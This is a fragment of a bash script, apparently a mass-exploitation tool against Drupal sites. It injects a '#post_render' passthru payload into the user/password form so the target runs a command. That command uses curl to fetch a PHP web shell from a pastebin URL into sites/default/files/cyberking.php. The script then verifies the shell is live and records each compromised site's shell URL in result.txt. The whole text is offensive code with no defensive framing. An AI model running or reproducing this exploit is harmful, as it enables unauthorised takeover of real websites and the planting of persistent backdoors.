...
          upload=$(curl -s -X POST -b cookie.tmp "${target}/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=curl+-o+sites/default/files/cyberking.php+"https://pastebin.com/raw/MrZtAvgx"" --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id | grep -Po '(?<=value=")[^" \>]*' | head -1);

          curl -s -X POST -b cookie.tmp "${target}/?q=file/ajax/name/%23value/${upload}" --data "form_build_id=${upload}" | head -1 > /dev/null

          cekshell=$(curl -s "${target}/sites/default/files/cyberking.php");

          if [[ $cekshell =~ 'Cyberking' ]]; then

            echo "Upload Done"

            echo "$result" >> result.txt

            echo "$target/sites/default/files/cyberking.php" | tee -a result.txt
